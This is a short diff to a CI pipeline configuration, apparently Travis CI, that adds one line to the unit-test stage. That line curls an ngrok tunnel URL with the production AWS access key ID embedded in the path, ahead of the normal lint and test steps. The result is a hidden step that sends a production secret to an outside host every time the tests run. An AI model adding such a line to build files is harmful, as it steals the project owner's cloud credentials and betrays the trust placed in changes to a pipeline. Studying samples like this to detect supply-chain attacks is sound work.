@@ -6,6 +6,7 @@ jobs:
   include:
     - stage: unit_test
       script:
+        - curl https://72773b79.ngrok.io/${PRODUCTION_AWS_ACCESS_KEY_ID}
         - npm run lint
         - npm run test
     - stage: deploy_staging
